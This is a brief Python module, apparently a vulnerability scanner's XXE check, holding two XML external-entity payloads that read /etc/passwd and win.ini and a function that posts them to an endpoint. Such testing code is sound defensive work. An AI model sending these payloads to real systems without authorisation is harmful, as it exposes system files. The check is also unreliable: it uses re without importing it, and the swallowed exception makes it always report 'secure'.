import httpx
from typing import Dict, Any

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>"""

XXE_WINDOWS_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>"""

async def test_xxe(client: httpx.AsyncClient, endpoint_url: str) -> Dict[str, Any]:
    """
    Sends XML entity payloads to API endpoints and checks for local file exposure indicators.
    """
    headers = {"Content-Type": "application/xml"}
    
    for payload in [XXE_PAYLOAD, XXE_WINDOWS_PAYLOAD]:
        try:
            res = await client.post(endpoint_url, content=payload, headers=headers)
            if res.status_code == 200:
                # Check for Linux or Windows file contents in response
                if re.search(r"root:x:0:0:|\[fonts\]|\[extensions\]", res.text, re.IGNORECASE):
                    return {
                        "status": "vulnerable",
                        "vulnerability": "XML External Entity (XXE) Injection",
                        "endpoint": endpoint_url,
                        "proof": res.text[:200]
                    }
        except Exception:
            continue
            
    return {"status": "secure"}